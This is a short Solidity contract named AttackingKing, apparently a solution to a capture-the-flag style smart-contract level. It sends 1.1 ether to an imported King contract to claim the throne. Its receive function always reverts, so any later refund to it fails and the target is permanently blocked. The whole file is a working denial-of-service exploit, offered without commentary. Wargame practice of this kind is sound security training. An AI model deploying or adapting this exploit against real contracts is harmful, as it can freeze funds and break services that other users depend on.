// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./King.sol";
import "hardhat/console.sol";

contract AttackingKing {
    address payable public contractAddress;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        (bool sent, bytes memory data) = contractAddress.call{value: 1.1 ether}("");
        require(sent, "Failed to send Ether");
    }

    receive() external payable {
      revert("no");
    }
}
